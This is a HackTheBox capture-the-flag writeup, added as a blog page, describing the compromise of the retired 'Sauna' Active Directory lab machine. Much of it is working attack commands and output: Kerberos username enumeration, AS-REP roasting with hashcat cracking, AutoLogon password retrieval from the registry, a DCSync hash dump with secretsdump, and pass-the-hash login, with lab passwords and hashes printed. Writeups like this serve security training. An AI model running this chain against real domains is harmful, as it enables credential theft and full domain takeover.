@@ -1,0 +1,388 @@
+---
+slug: "htb-sauna"
+title: "Sauna — HackTheBox Machine Writeup"
+date: "2026-08-06"
+platform: "HackTheBox"
+type: "Machine"
+category: "Active Directory"
+os: "Windows"
+difficulty: "Easy"
+tags:
+  - "Active Directory"
+  - "AS-REP Roasting"
+  - "Kerberos"
+  - "DCSync"
+  - "Pass-the-Hash"
+  - "pharaohound"
+  - "WinRM"
+excerpt: "A classic easy Active Directory box: usernames harvested from a public web page feed an AS-REP roast, and a forgotten AutoLogon password unlocks a DCSync-capable service account."
+readTime: "25 min"
+retired: true
+rating: 4.5
+hasAutoScript: false
+url: "https://asbawy.github.io/writeups/htb-sauna"
+---
+
+import { Callout } from "@/components/Callout";
+import { KillChain, SpoilerFlag, SkillMatrix } from "@/components/cyber/WriteupComponents";
+import { TerminalReplay } from "@/components/cyber/TerminalReplay";
+
+<KillChain
+  steps={[
+    {
+      phase: "Reconnaissance",
+      title: "Information Gathering & Enumeration",
+      desc: "Enumerated the Domain Controller via Nmap, identifying Kerberos and LDAP. Extracted employee names from the IIS website to generate valid username candidates.",
+      tools: ["nmap", "curl", "kerbrute"],
+    },
+    {
+      phase: "Initial Access",
+      title: "AS-REP Roasting",
+      desc: "Leveraged valid usernames to perform AS-REP roasting against accounts without pre-authentication requirements, obtaining fsmith's Kerberos ticket and cracking it offline.",
+      technique: "AS-REP Roasting",
+      tools: ["impacket-GetNPUsers", "hashcat"],
+    },
+    {
+      phase: "Privilege Escalation",
+      title: "DCSync & Pass-the-Hash",
+      desc: "Discovered AutoLogon credentials for a service account via WinRM registry enumeration. Utilized the account's DCSync privileges to dump the Administrator's NTLM hash and authenticate via Pass-the-Hash.",
+      technique: "DCSync",
+      tools: ["evil-winrm", "pharaohound", "impacket-secretsdump", "crackmapexec"],
+    },
+  ]}
+/>
+
+## Challenge Overview
+
+Sauna is a Windows Domain Controller running an IIS website that leaks the
+names of every employee on a "Meet The Team" page. Those names become Kerberos
+username candidates, and one account (`fsmith`) is **AS-REP roastable** — it
+does not require Kerberos pre-authentication, so its password can be requested
+and cracked offline. The resulting WinRM session reveals **AutoLogon
+credentials** for a loan-manager service account (`svc_loanmgr`) stored in the
+registry, and that account holds **DCSync rights** (Replicating Directory
+Changes). A single `secretsdump` call then hands over the domain, and a
+Pass-the-Hash login as Administrator closes the box.
+
+
+<Callout type="info">
+  **Tooling note:** all Active Directory *collection and analysis* on this
+  machine is done with **pharaohound** — a single tool that queries the DC
+  over LDAP (its built-in collector), builds the object graph, and runs 30+
+  analyzers to rank attack paths. No BloodHound/SharpHound needed.
+</Callout>
+
+## Reconnaissance & Service Enumeration
+
+### Port Scan
+
+Full TCP sweep first:
+
+```bash
+nmap -p- --min-rate 5000 -T4 -Pn -n 10.129.56.80 -oN scans/all-ports.txt
+```
+
+```text
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+```
+
+![Full TCP port scan](https://i.imgur.com/PiqMLxM.png)
+
+The mix of Kerberos (88), LDAP (389/636), global catalog (3268/3269) and
+WinRM (5985) is the signature of a **Domain Controller**. Service versions
+confirm it:
+
+```bash
+nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sC -sV -T4 -Pn -n 10.129.56.80 -oN scans/services.txt
+```
+
+```text
+80/tcp   open  http     Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: ...)
+389/tcp  open  ldap     Microsoft Windows Active Directory LDAP
+                       (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
+5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+```
+
+**Domain:** `EGOTISTICAL-BANK.LOCAL` — hostname `SAUNA`. WinRM being open
+means `evil-winrm` is a viable shell once we have credentials.
+
+### Website Enumeration (Port 80)
+
+The IIS site is a static bank template ("Egotistical Bank"). The interesting
+page is `/about.html`
+The "Meet The Team" page lists six employees:
+
+| First name | Surname   | Username candidate |
+|---|---|---|
+| Fergus  | Smith  | `fsmith`  |
+| Shaun   | Coins  | `scoins`  |
+| Hugo    | Bear   | `hbear`   |
+| Bowie   | Taylor | `btaylor` |
+| Sophie  | Driver | `sdriver` |
+| Steven  | Kerb   | `skerb`   |
+
+![Meet The Team page](https://i.imgur.com/3w4ORfG.png)
+
+<Callout type="info">
+  **Key insight:** AD usernames follow predictable conventions. A
+  `[first initial][lastname]` format gives a short candidate list to throw at
+  Kerberos — the KDC answers *differently* for existing and non-existing
+  accounts, which is exactly how username enumeration works.
+</Callout>
+
+### SMB / LDAP Quick Checks
+
+Anonymous SMB has no readable shares, and the LDAP tree is locked down for
+anonymous binds:
+
+```bash
+smbclient -N -L //10.129.56.80
+```
+
+## Username Enumeration with kerbrute
+
+```bash
+kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.129.56.80 users.txt
+```
+
+```text
+2026/08/06 04:22:13 >  [+] VALID USERNAME:	 administrator@EGOTISTICAL-BANK.LOCAL
+2026/08/06 04:22:13 >  [+] VALID USERNAME:	 sauna@EGOTISTICAL-BANK.LOCAL
+2026/08/06 04:22:13 >  [+] VALID USERNAME:	 fsmith@EGOTISTICAL-BANK.LOCAL
+2026/08/06 04:22:13 >  [+] VALID USERNAME:	 hsmith@EGOTISTICAL-BANK.LOCAL
+2026/08/06 04:22:13 >  Done! Tested 9 usernames (4 valid) in 0.149 seconds
+```
+
+![kerbrute user enumeration](https://i.imgur.com/jWLTjeR.png)
+
+Four valid accounts: `administrator`, `sauna`, `fsmith`, `hsmith`.
+
+## Initial Access — AS-REP Roasting
+
+### Why AS-REP roasting works
+
+In Kerberos, the *first* ticket request (AS-REQ) is normally sent encrypted
+with the user's password-derived key to prove the client knows the password
+(**pre-authentication**). When an account has `UF_DONT_REQUIRE_PREAUTH` set,
+the KDC happily returns an encrypted TGT for *anyone* who asks. That TGT is
+encrypted with the user's password hash — so we can brute-force the password
+offline from the ticket alone.
+
+`impacket-GetNPUsers` asks the KDC for a TGT for each candidate:
+
+```bash
+impacket-GetNPUsers 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat \
+  -outputfile loot/hashes.asreproast -dc-ip 10.129.56.80
+```
+
+```text
+[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
+[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sauna doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+![AS-REP roast](https://i.imgur.com/eimTJ3p.png)
+
+`fsmith` is roastable — a `$krb5asrep$23$` hash is written to disk
+(truncated here, full value in `loot/hashes.asreproast`):
+
+```text
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:e557e09da8702f21b19d58ef599a94a1$903c40a1dd74e856402f58733645a194d43adc629addaaa8...
+```
+
+### Cracking the hash
+
+Mode **18200** is the AS-REP hash format:
+
+```bash
+hashcat -m 18200 loot/hashes.asreproast /usr/share/wordlists/rockyou.txt --force -O
+```
+
+```text
+Session..........: hashcat
+Status...........: Cracked
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...:Thestrokes23
+```
+
+![hashcat crack](https://i.imgur.com/k9hkqhC.png)
+
+
+### Shell as fsmith
+
+```bash
+crackmapexec winrm 10.129.56.80 -u fsmith -p 'Thestrokes23'
+
+WINRM  10.129.56.80  5985  SAUNA  [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 (Pwn3d!)
+```
+
+```bash
+evil-winrm -i 10.129.56.80 -u fsmith -p 'Thestrokes23'
+```
+
+![evil-winrm session as fsmith](https://i.imgur.com/bboinBQ.png)
+
+```powershell
+*Evil-WinRM* PS C:\Users\FSmith\Documents> type C:\Users\FSmith\Desktop\user.txt
+```
+
+### User flag
+<SpoilerFlag label="HTB user flag" flag="a2175b607415ec4b5911cb85a58c9577" />
+
+## Active Directory Collection & Analysis with pharaohound
+
+With valid credentials, pharaohound's **built-in collector** queries the DC
+over LDAP and pulls every domain object (users, groups, computers, GPOs,
+containers, ACLs) in a couple of seconds:
+
+```bash
+pharaohound collect -t 10.129.56.80 -u fsmith -p 'Thestrokes23' \
+  -d EGOTISTICAL-BANK.LOCAL --method All --no-zip -o pha-collect/
+
+═════════════════════════════════════════════════════════════════
+  [✓] Collection complete in 1.5s
+    Total objects: 181
+    SID cache: 78 entries
+═════════════════════════════════════════════════════════════════
+```
+
+![pharaohound LDAP collection](https://i.imgur.com/GyiA9Kw.png)
+
+Analyzing the collection (with `fsmith` marked as compromised) ranks the
+attack paths:
+
+```bash
+pharaohound pha-collect/ -o pharaohound-report/ --format both --all --no-color \
+  --user fsmith@EGOTISTICAL-BANK.LOCAL
+
+  [CRITICAL] UNCONSTRAINED DELEGATION
+  [CRITICAL] GOLDEN TICKET FORGING CAPABILITIES
+  [HIGH    ] KERBEROASTABLE USERS
+  [HIGH    ] AS-REP ROASTABLE USERS
+  [HIGH    ] MACHINE ACCOUNT QUOTA ABUSE
+  Risk Level: HIGH — Multiple critical paths to Domain Admin
+
+◆ Path 1: AS-REP Roast: FSmith@EGOTISTICAL-BANK.LOCAL  🟢
+◆ Path 2: MAQ → RBCD: EGOTISTICAL-BANK.LOCAL (quota=10)  🟠
+▲ Path 3: Unconstrained Delegation: SAUNA.EGOTISTICAL-BANK.LOCAL  🟠
+```
+
+![pharaohound analysis report](https://i.imgur.com/Mo3FTqV.png)
+
+<Callout type="warning">
+  **Attack-path map:** Path 1 (the one we already used) confirms the
+  AS-REP roast. Path 3 flags that the DC computer account itself has
+  **unconstrained delegation** — a classic setup for forcing authentication
+  and grabbing a `DC$` TGT, which can then be used for DCSync. Either way the
+  destination is the same: Domain Admin.
+</Callout>
+
+## Privilege Escalation — fsmith → svc_loanmgr
+
+### AutoLogon credentials in the registry
+
+Windows can log a user in automatically at boot; the credentials are stored
+under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`. It is a
+surprisingly common misconfiguration on lab/legacy machines:
+
+```powershell
+*Evil-WinRM* PS C:\Users\FSmith\Documents> reg query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
+```
+
+```text
+DefaultDomainName    REG_SZ    EGOTISTICALBANK
+DefaultUserName      REG_SZ    EGOTISTICALBANK\svc_loanmanager
+DefaultPassword      REG_SZ    Moneymakestheworldgoround!
+```
+
+![AutoLogon registry credentials](https://i.imgur.com/0CN9FS0.png)
+
+The account is actually `svc_loanmgr` (the display name says
+"loanmanager"). Verify the credentials:
+
+```bash
+crackmapexec winrm 10.129.56.80 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
+
+WINRM  10.129.56.80  5985  SAUNA  [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround! (Pwn3d!)
+```
+
+<Callout type="info">
+  **Why this matters:** `svc_loanmgr` is a service account — and on this
+  domain it has been granted far more than it needs.
+</Callout>
+
+## Domain Compromise — DCSync with svc_loanmgr
+
+Re-collecting with the more privileged account and re-analyzing shows the
+same picture — multiple roads to Domain Admin. The decisive right is
+**DCSync**: the `Replicating Directory Changes` (and `All`) permissions let
+an account impersonate a Domain Controller and ask for any account's password
+hash over the replication protocol. It is intended for backup agents; here it
+was handed to a loan-manager bot.
+
+The proof is one command:
+
+```bash
+impacket-secretsdump 'EGOTISTICAL-BANK/svc_loanmgr:Moneymakestheworldgoround!@10.129.56.80'
+```
+
+```text
+[*] Target system bootKey: 0x8c1c8e2d51e4e4f9d4f6b1f5d5a6c5b4
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+[*] Dumping domain hashes (uid:rid:lmhash:nthash)
+Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+...
+[*] Cleaning up...
+```
+
+![secretsdump DCSync](https://i.imgur.com/vuQcsW0.png)
+
+**Administrator NTLM hash: `823452073d75b9d1cf70ebdf86c7f98e`**
+
+## Root — Pass-the-Hash as Administrator
+
+With the NTLM hash we never need the Administrator password — WinRM accepts
+the hash directly:
+
+```bash
+evil-winrm -i 10.129.56.80 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
+```
+
+![Pass-the-Hash as Administrator](https://i.imgur.com/DeEbzUz.png)
+
+```powershell
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
+```
+
+### Root flag
+
+<SpoilerFlag label="HTB root flag" flag="ba9737a7ad905c506ebbd2096ebb08e5" />
+
+
+## References
+
+- [HTB Sauna machine page](https://app.hackthebox.com/machines/Sauna)
+- [AS-REP Roasting (HackTricks)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)
+- [DCSync attacks explained](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)
+- [Pass-the-Hash basics](https://www.thehacker.recipes/ad/movement/ntlm/pth)
+- [pharaohound — AD collection & analysis framework](https://github.com/Asbawy/pharaohound)
+- [evil-winrm](https://github.com/Hackplayers/evil-winrm)
